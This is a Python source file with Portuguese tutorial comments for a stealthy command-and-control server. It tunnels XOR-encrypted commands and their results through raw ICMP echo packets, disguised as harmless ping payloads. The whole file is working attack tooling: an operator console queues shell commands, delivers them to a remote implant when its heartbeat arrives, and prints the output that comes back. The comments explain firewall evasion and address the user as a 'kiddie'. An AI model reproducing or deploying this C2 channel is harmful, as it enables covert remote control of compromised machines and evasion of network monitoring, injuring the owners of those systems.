# ==================================================================================
# SERVIDOR C2 (LISTENER) COM MULTITHREADING E FILA DE COMANDOS
# ==================================================================================

import socket       # Rede e Raw Sockets.
import struct       # Construção manual de pacotes (cabeçalhos).
import threading    # ESSENCIAL: Permite rodar a escuta de rede e o input do teclado ao mesmo tempo.
import sys          # Sistema (sair do programa).
import time         # (Não muito usado aqui, mas importado por padrão).

# --- CONFIGURAÇÕES GLOBAIS ---
# Estas chaves têm de ser IDÊNTICAS às do Agente. Se mudar um bit, a comunicação falha.
CHAVE_XOR = 0xAA         
ALFABETO = "abcdefghijklmnop"

# --- ESTADO DO SERVIDOR ---
# Esta variável é o "Quadro de Avisos".
# Como não podemos conectar ao Agente quando queremos (por causa do Firewall dele),
# quando tu digitas um comando, nós guardamos aqui.
# Assim que o Agente fizer "ping", nós olhamos para esta variável e entregamos a ordem.
comando_pendente = None 

# --- FUNÇÃO DE CHECKSUM ---
# (Mesma lógica do agente. Obrigatório para o pacote não ser descartado pelo OS)
def checksum(source_string):
    if len(source_string) % 2 != 0: source_string += b'\x00'
    sum = 0; count = 0
    while count < len(source_string):
        val = source_string[count + 1] * 256 + source_string[count]
        sum = (sum + val) & 0xffffffff; count += 2
    sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16)
    return (~sum & 0xffff) >> 8 | ((~sum & 0xffff) << 8 & 0xff00)

# --- TÉCNICAS DE CAMUFLAGEM (Encoding e Criptografia) ---
# O servidor precisa das mesmas funções do agente, pois a comunicação é bidirecional.
# Se o servidor respondesse em texto claro, o firewall bloquearia a RESPOSTA.

def encode_fake_ping(dados_bytes):
    """Converte bytes criptografados em letras 'a-p' para parecer tráfego legítimo."""
    payload_texto = ""
    for byte in dados_bytes:
        high = (byte >> 4) & 0x0F
        low = byte & 0x0F
        payload_texto += ALFABETO[high] + ALFABETO[low]
    return payload_texto.encode('utf-8')

def decode_fake_ping(dados_texto):
    """Processo inverso: Recebe 'kp' e transforma no byte original."""
    try:
        texto = dados_texto.decode('utf-8')
    except: return None
    bytes_reconstruidos = bytearray()
    for i in range(0, len(texto), 2):
        if i+1 >= len(texto): break
        try:
            high = ALFABETO.index(texto[i])
            low = ALFABETO.index(texto[i+1])
            bytes_reconstruidos.append((high << 4) | low)
        except: return None
    return bytes_reconstruidos

def xor_data(data):
    """Aplica/Remove a cifra XOR simples."""
    return bytes([b ^ CHAVE_XOR for b in data])

# --- CONSTRUÇÃO DE PACOTES ---
def create_packet(payload_str):
    """
    Prepara o pacote para enviar ao Agente.
    Nota: Estamos enviando Type 8 (Request) de volta. 
    Tecnicamente, um servidor deveria responder com Type 0 (Reply), 
    mas para simplificar o código do agente (que só ouve requests), usamos 8.
    """
    if isinstance(payload_str, str): payload_str = payload_str.encode('utf-8')
    
    # 1. Criptografa
    payload_xor = xor_data(payload_str)
    # 2. Camufla
    payload_camuflado = encode_fake_ping(payload_xor)
    
    # Monta cabeçalho, calcula checksum, remonta cabeçalho
    header = struct.pack('bbHHh', 8, 0, 0, 1, 1)
    chk = checksum(header + payload_camuflado)
    header = struct.pack('bbHHh', 8, 0, socket.htons(chk), 1, 1)
    
    return header + payload_camuflado

# --- O OUVIDO DO SERVIDOR (Thread Secundária) ---
def listener_thread(sock):
    # Precisamos acessar a variável global para ler e limpar os comandos pendentes
    global comando_pendente
    
    while True:
        try:
            # O servidor fica bloqueado aqui até chegar QUALQUER pacote ICMP
            raw_data, addr = sock.recvfrom(65535)
            
            # Corta os cabeçalhos IP (20 bytes) e ICMP (8 bytes)
            payload_camuflado = raw_data[28:]
            if not payload_camuflado: continue

            # --- PIPELINE DE DESENCAPSULAMENTO ---
            # 1. Tenta decodificar de 'a-p' para bytes
            payload_cifrado = decode_fake_ping(payload_camuflado)
            if not payload_cifrado: continue # Se falhar, era um ping real da internet, ignora.
            
            # 2. Remove o XOR e transforma em texto
            msg = xor_data(payload_cifrado).decode('utf-8', errors='ignore')

            # --- LÓGICA DE CONTROLE ---
            
            # CASO A: Recebemos um "Estou vivo" (Heartbeat)
            if "HEARTBEAT" in msg:
                # Verificamos se o kiddie deixou alguma ordem na "geladeira"
                if comando_pendente:
                    # Se sim, empacotamos a ordem...
                    pkt = create_packet(f"CMD:{comando_pendente}")
                    # ...e enviamos para o IP de quem mandou o heartbeat (addr[0])
                    sock.sendto(pkt, (addr[0], 1))
                    
                    print(f"\n[+] Comando enviado para {addr[0]}!")
                    # Limpamos a pendência para não enviar o mesmo comando 1000 vezes
                    comando_pendente = None
            
            # CASO B: Recebemos a resposta de um comando anterior
            elif msg.startswith("RES:"):
                # Formatação bonita para o kiddie ler
                print(f"\n\nRESULTADO DE {addr[0]}:\n{msg[4:]}\nC2> ", end="")
                # Força o print aparecer imediatamente no terminal
                sys.stdout.flush()
                
        except Exception: pass

# --- A INTERFACE DO KIDDIE (Thread Principal) ---
def main():
    global comando_pendente
    try:
        # Cria o socket Raw. Precisa de SUDO.
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        # Bind no 0.0.0.0 significa "escutar em todas as placas de rede"
        sock.bind(('0.0.0.0', 0))
    except: sys.exit("Erro: Use SUDO.")

    # --- A MÁGICA DO THREADING ---
    # Iniciamos a função 'listener_thread' em paralelo.
    # daemon=True significa: "Se o programa principal fechar, mata esta thread também".
    threading.Thread(target=listener_thread, args=(sock,), daemon=True).start()
    
    print("C2 FURTIVO ONLINE (Camaleão ativado)")

    # Loop infinito de INPUT (Interface do Usuário)
    while True:
        # O programa para aqui e espera tu digitares algo.
        # Graças à thread acima, a rede continua a ser escutada enquanto tu pensas.
        cmd = input("C2> ")
        
        if cmd:
            # Quando der ENTER, guardamos o comando na variável global.
            # A thread 'listener_thread' vai ler esta variável quando o próximo Heartbeat chegar.
            comando_pendente = cmd
            print("Aguardando Heartbeat...")

if __name__ == "__main__":
    main()